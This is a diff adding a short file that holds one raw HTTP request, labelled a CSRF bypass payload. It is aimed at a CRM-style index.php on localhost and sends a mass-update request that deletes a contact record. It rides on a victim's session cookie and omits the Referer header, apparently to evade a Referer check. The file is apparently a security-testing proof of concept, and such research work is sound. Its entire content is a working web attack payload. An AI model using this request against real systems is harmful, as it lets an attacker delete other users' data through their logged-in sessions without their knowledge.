@@ -1,0 +1,8 @@
+### CamelCase bypass request (no Referer) — the CSRF payload a cross-site form would POST
+POST /index.php HTTP/1.1
+Host: localhost:33116
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=<victim session>
+(NO Referer header)
+
+module=Contacts&action=MassUpdate&massupdate=true&uid=f43b7c6a-5b8e-4bfe-a954-6ef9321dc5d6&Delete=true&return_module=Contacts&return_action=index&current_query_by_page=%7B%7D
